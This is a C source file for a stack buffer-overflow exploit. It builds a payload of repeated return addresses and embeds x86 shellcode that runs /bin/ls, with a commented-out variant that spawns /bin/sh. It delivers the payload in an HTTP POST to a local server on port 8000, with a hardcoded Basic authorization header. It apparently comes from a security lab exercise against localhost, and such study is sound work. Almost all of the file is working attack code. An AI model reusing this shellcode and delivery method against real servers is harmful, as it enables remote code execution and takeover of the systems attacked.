#include <stdio.h>		/* printf, sprintf */
#include <stdlib.h>		/* exit */
#include <unistd.h>		/* read, write, close */
#include <string.h>		/* memcpy, memset */
#include <sys/socket.h> /* socket, connect */
#include <netinet/in.h> /* struct sockaddr_in, struct sockaddr */
#include <netdb.h>		/* struct hostent, gethostbyname */

// put the shellcode here in binary form: "\xAA\xBB..."
char shellcode[] = "U\211\345\353\036^1\300\210F\a\211v\b\211F\f\260\v\211\363\215N\b1\322̀1\300@1\333̀\350\335\377\377\377/bin/ls";
// char shellcode[] = "U\211\345\353\036^1\300\210F\a\211v\b\211F\f\260\v\211\363\215N\b1\322̀1\300@1\333̀\350\335\377\377\377/bin/sh"; //shell

#define NOP 0x90

#ifndef offset
#define offset 0
#endif

unsigned long get_esp(void)
{
	__asm__("movl %esp,%eax");
}

void error(const char *msg)
{
	perror(msg);
	exit(0);
}

int main(int argc, char *argv[])
{

	int payload_size = 96; // size of our long payload
						   // int offset = 3608;         // offset to our ESP 3608  3017

	char *payload = malloc(payload_size * sizeof(char));

	long addr = get_esp() - offset;
	addr = 0xffa095f0;
	//  0xffaedd80
	fprintf(stderr, "Using address:  0x%lx\n", addr);

	// write the address everywhere
	for (int i = 0; i < payload_size / 4; i++)
	{
		((long *)payload)[i] = addr;
		if (i == 2)
		{
			((long *)payload)[i] = 0xa;
		}
		if (i >= (payload_size / 4) - 5)
		{
			((long *)payload)[i] = 0xffa095f0;
		}
	}

	// 0 only at the very end
	payload[payload_size - 1] = '\0';
	// for (int i = 0; i < payload_size / 4; i++)
	//     fprintf(stderr, "0x%lx\n", ((long *)payload)[i]);

	// fprintf(stderr, "\n");
	/* first what are we going to send and where are we going to send it? */
	int portno = 8000;
	char *host = "127.0.0.1";
	char *message_fmt = (char *)malloc(sizeof(char) * (payload_size + 400));
	strcpy(message_fmt, "POST / HTTP/1.1\r\nHost: 127.0.0.1:8000\r\nUser-Agent: curl/7.81.0\r\nAccept: /\r\nAccept-Encoding: deflate, gzip, br, zstd\r\nAuthorization: Basic dGVzdDowMjk3OTRkYjZlNzZjYjU1OTYxMzczMmQ3Yzk0YjI0YjM2MGJiNmYwNTg3OWJiOTllNzc2NTUxOGI1NWFiYzU3Cg==\r\nContent-Length: 3 \r\nContent-Type: application/x-www-form-urlencoded \r\n\r\n");
	strncat(message_fmt, payload, payload_size);
	strcat(message_fmt, "\r\n\r\n");

	struct hostent *server;
	struct sockaddr_in serv_addr;
	int sockfd, bytes, sent, received, total;
	char message[1024], response[4096];

	/* create the socket */
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0)
		error("ERROR opening socket");

	/* lookup the ip address */
	server = gethostbyname(host);
	if (server == NULL)
		error("ERROR no such host");

	/* fill in the structure */
	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(portno);
	memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);

	/* connect the socket */
	if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
		error("ERROR connecting");
	/* send the request */
	total = strlen(message_fmt);
	sent = 0;
	do
	{
		bytes = write(sockfd, message_fmt + sent, total - sent);
		if (bytes < 0)
			error("ERROR writing message to socket");
		if (bytes == 0)
			break;
		sent += bytes;
	} while (sent < total);
	/* receive the response */

	// total = sizeof(response) - 1;
	total = 0;
	while (1)
	{

		bytes = read(sockfd, response, 1);
		if (bytes < 1)
		{
			fprintf(stderr, "END!\n");
			return 0;
		}
		fprintf(stderr, "%c\n", *response);
		fflush(0);
	}

	total = 99; // 100
	received = 0;
	do
	{
		bytes = read(sockfd, response + received, total - received);
		if (bytes < 0)
			error("ERROR reading response from socket");
		if (bytes == 0)
			break;
		received += bytes;
	} while (received < total);
	message_fmt = "echo something\n";

	// total = strlen(message_fmt);
	// sent = 0;
	// do
	// {
	// 	bytes = write(sockfd, message_fmt + sent, total - sent);
	// 	if (bytes < 0)
	// 		error("ERROR writing message to socket");
	// 	if (bytes == 0)
	// 		break;
	// 	sent += bytes;
	// } while (sent < total);
	// total = 99; // 100
	// received = 0;
	// do
	// {
	// 	bytes = read(sockfd, response + received, 1);
	// 	printf("%c\n", response + received);
	// 	fflush(0);
	// 	if (bytes < 0)
	// 		error("ERROR reading response from socket");
	// 	if (bytes == 0)
	// 		break;
	// 	received += bytes;
	// } while (received < total);

	/*
	 * if the number of received bytes is the total size of the
	 * array then we have run out of space to store the response
	 * and it hasn't all arrived yet - so that's a bad thing
	 */
	// if (received == total)
	//     error("ERROR storing complete response from socket");

	/* close the socket */
	close(sockfd);

	/* process response */
	printf("Response:\n%s\n", response);

	return 0;
}
